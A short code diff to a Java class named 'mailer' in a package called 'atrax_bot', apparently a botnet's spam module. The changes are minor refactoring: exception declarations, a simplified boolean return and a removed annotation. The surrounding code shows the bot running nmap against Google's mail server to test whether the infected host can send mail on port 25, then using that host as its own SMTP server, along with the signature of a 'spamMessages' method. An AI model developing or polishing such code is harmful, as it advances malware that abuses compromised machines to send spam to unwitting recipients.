@@ -7,6 +7,7 @@ package atrax_bot;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.IOException;
 import java.net.Socket;
 import java.text.DateFormat;
 import java.util.Date;
@@ -25,7 +26,7 @@ public class mailer {
     String mode;
     String smtpServer;
     
-    public mailer(bot theBot) {
+    public mailer(bot theBot) throws IOException {
         if (mailer.canSendSMTP("gmail-smtp-in.1.google.com")) {
             mode = "self";
             smtpServer = theBot.hostNetParams.hostFQDN;
@@ -52,12 +53,8 @@ public class mailer {
      * it checks whether the host can send 
      * out mail on port 25
      ****************************************/
-    private static Boolean canSendSMTP(String smtpServer){
-        if(tools.runCmd("nmap -Pn " + smtpServer + " -p 25").contains("25/tcp open  smtp")) {
-            return true;
-        } else {
-            return false;
-        }
+    private static Boolean canSendSMTP(String smtpServer) throws IOException{
+        return tools.runCmd("nmap -Pn " + smtpServer + " -p 25").contains("25/tcp open  smtp");
     }
     
     /*************************************
@@ -74,7 +71,7 @@ public class mailer {
      * @param body
      * @return 
      *************************************/
-    @SupressWarnings("deprecation")
+    
     public static Boolean spamMessages(String smtpServer, int port, String subject, String fromAddress, String toAddress, String body) {
         Socket smtpSocket = null;
         DataOutputStream socketOutputStream = null;
